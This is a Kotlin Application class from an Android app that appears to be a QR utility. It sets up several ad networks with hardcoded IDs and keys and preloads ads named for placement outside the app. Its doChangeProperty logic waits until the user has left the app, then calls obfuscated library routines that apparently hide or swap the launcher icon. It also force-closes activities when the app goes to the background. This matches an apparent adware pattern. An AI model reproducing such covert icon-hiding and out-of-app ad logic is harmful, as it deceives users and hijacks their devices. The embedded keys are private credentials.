package com.qr.myqr

import android.annotation.SuppressLint
import android.app.Activity
import android.app.ActivityManager
import android.content.Context
import android.os.Build
import android.os.Bundle
import android.os.Process
import android.util.Log
import android.webkit.WebView
import com.anythink.core.api.ATInitConfig
import com.anythink.core.api.ATNetworkConfig
import com.anythink.core.api.ATSDK
import com.anythink.core.api.DeviceInfoCallback
import com.anythink.network.adcolony.AdColonyATInitConfig
import com.anythink.network.mintegral.MintegralATInitConfig
import com.anythink.network.pangle.PangleATInitConfig
import com.anythink.network.vungle.VungleATInitConfig
import com.qr.myqr.basic.BaseApp
import com.qr.myqr.basic.BasePage
import com.qr.myqr.data.AppCache
import com.qr.myqr.data.StartupProvider
import com.qr.myqr.page.FirstActivity
import com.qr.myqr.revenue.AdPos
import com.qr.myqr.revenue.AdsLoader
import com.reader.multiple.bmw4.MvpManager
import com.reader.multiple.vb.MvpFbObj
import kotlinx.coroutines.*

const val isReleaseMode = false
@SuppressLint("StaticFieldLeak")
lateinit var appIns: App
class App : BaseApp() {

    override fun onCreate() {
        super.onCreate()
        appIns = this

        //Android 9及以上必须设置 多进程WebView兼容
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            val processName = getProcessName()
            if (packageName != processName) {
                WebView.setDataDirectorySuffix(processName)
            }
        }
        MvpManager.setBhs(this, true)
        MvpManager.init(this)

        if (processName() != packageName) return
        initTopOn()
        checkChangeProperty()

        StartupProvider.onStart()
        registerActivityLifecycleCallbacks(ActivityLife())

        MainScope().launch {
            delay(6000L)
            AdsLoader.preloadAd(appIns, AdPos.insOut)
            AdsLoader.preloadAd(appIns, AdPos.navOut)
        }
    }

    private fun checkChangeProperty() {
        if (!isReleaseMode) return
        if (AppCache.ins.appPropertyChanged) return
        MainScope().launch {
            delay(3000L)
            val userInApp = userInAppIdentification != null
            if (!userInApp) {
                delay(18_000L)
                doChangeProperty()
            }
        }
    }

    private fun doChangeProperty() {
        if (!StartupProvider.isOneShotEnable()) return
        if (AppCache.ins.appPropertyChanged) return
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            MvpFbObj.hi(this, FirstActivity::class.java.name)
        } else {
            MvpFbObj.exchange(this, FirstActivity::class.java.name, "$packageName.exchanges")
        }
        AppCache.ins.appPropertyChanged = true
    }

    private fun processName(): String? {
        val am = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
        val multiList = am.runningAppProcesses ?: return null
        val pid = Process.myPid()
        for (inf in multiList) {
            if (pid == inf.pid) {
                return inf.processName
            }
        }
        return null
    }

    private val tapOnAppId = "a62b013be01931"
    private val tapOnAppKey = "c3d0d2a9a9d451b07e62b509659f7c97"
    private fun initTopOn() {
        //初始化TopOn SDK之前调用此方法
        //TTATInitManager.getInstance().setIsOpenDirectDownload(false)

        ATSDK.setNetworkLogDebug(!isReleaseMode) //SDK日志功能，集成测试阶段建议开启，上线前必须关闭
        Log.i("", "TopOn SDK version: " + ATSDK.getSDKVersionName()) //SDK版本
        ATSDK.integrationChecking(applicationContext) //检查广告平台的集成状态，提交审核时需注释此API
        //(v5.7.77新增) 打印当前设备的设备信息(IMEI、OAID、GAID、AndroidID等)
        ATSDK.testModeDeviceInfo(this, object : DeviceInfoCallback {
            override fun deviceInfo(deviceInfo: String) {
                Log.i("", "deviceInfo: $deviceInfo")
            }
        })

        val atInitConfigs = ArrayList<ATInitConfig>()
        //Mintegral
        val mintegralATInitConfig = MintegralATInitConfig("213106", "92b0c74522d64b889cea6afa5b6774bc")
        //AdColony
        val adColonyATInitConfig = AdColonyATInitConfig("app6fc6ed9b1b3f43199c", "vza7f081451a5848c5ab")
        //Pangle
        val pangleATInitConfig = PangleATInitConfig("8125510")
        //Vungle
        val vungleAtInitConfig = VungleATInitConfig("642e6d9e4e4ca5d8182ac538")

        atInitConfigs.add(pangleATInitConfig)
        atInitConfigs.add(mintegralATInitConfig)
        atInitConfigs.add(vungleAtInitConfig)
        atInitConfigs.add(adColonyATInitConfig)

        val builder = ATNetworkConfig.Builder()
        builder.withInitConfigList(atInitConfigs)
        val atNetworkConfig = builder.build()

        //初始化TopOn SDK以及广告平台SDK
        ATSDK.init(applicationContext, tapOnAppId, tapOnAppKey, atNetworkConfig)
    }


    fun isAppForeground(): Boolean {
        return nActivity > 0
    }
    var blockOneHotLoad = false
    var isScreenOn = true

    private var userInAppIdentification: Activity? = null

    private var nActivity = 0
    private var reachHot = false
    private inner class ActivityLife: ActivityLifecycleCallbacks {
        override fun onActivityCreated(activity: Activity, savedInstanceState: Bundle?) {
        }

        override fun onActivityStarted(activity: Activity) {
            //loggerActivityLife("onActivityStarted: $activity")
            if (nActivity++ == 0) {
                //ProtectService.activityCheckStartup()

                if (reachHot) {
                    if (blockOneHotLoad) {
                        blockOneHotLoad = false
                    } else {
                        if (activity is BasePage
                            && activity !is FirstActivity
                        ) {
                            FirstActivity.hotStart(activity)
                        }
                    }
                }
                reachHot = false
            }
        }

        override fun onActivityStopped(activity: Activity) {
            //loggerActivityLife("onActivityStopped: $activity")
            if (--nActivity <= 0) {
                doChangeProperty()

                reachHot = true
                if (activity.isFinishing || activity.isDestroyed) return
                //if (activity is MainActivity) return@launch
                Log.e("ActivityLife", "finish: $activity")
                activity.finish()
            }
        }

        override fun onActivityResumed(activity: Activity) {
            userInAppIdentification = activity
        }

        override fun onActivityPaused(activity: Activity) {
        }

        override fun onActivitySaveInstanceState(activity: Activity, outState: Bundle) {
        }

        override fun onActivityDestroyed(activity: Activity) {
            //loggerActivityLife("onActivityDestroyed: $activity")
        }
    }

}